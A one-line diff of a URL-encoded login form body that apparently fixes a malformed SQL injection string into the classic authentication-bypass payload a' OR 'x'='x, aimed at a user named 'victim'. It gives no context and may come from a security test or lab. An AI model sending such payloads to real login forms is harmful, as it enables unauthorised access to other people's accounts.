@@ -1,1 +1,1 @@
-username=victim&password=%27%20OR%20%271%27%20%27%20
+username=victim&password=a%27%20OR%20%27x%27%3D%27x
